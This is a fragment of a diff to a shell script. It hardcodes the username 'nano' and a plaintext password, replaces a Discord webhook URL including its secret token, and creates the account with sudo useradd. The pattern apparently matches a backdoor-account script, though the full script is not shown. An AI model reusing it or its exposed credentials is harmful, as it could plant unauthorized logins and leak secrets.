@@ -3,7 +3,7 @@
 # Variables
 USERNAME="nano"
 PASSWORD="Mizi123!"
-DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269083687388184618/TTuAOMwYmJysCRrW9vGK7TEkR9Rd5zpIdhAjA4zKd6-YO86UEqAzNp9aIhm_7bX1SXNk"
+DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
 
 # Create the user
 sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME
